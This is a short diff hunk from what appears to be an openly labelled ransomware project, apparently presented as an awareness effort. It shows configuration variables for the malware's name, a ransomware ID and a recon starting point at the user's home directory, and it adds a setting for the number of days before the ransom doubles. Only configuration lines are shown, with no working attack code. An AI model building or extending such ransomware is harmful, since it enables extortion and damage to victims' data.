@@ -10,6 +10,7 @@ We aim that the main reason for starting the project is increasing awareness of 
 what_is_my_name = "zararliyim.exe" 
 what_is_my_id = "1"# ransomwareID XXXX
 when_did_i_work = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+how_many_days_to_double_ransom = 2
 
 # the beginning point of recon
 root_directory = os.path.expanduser('~')
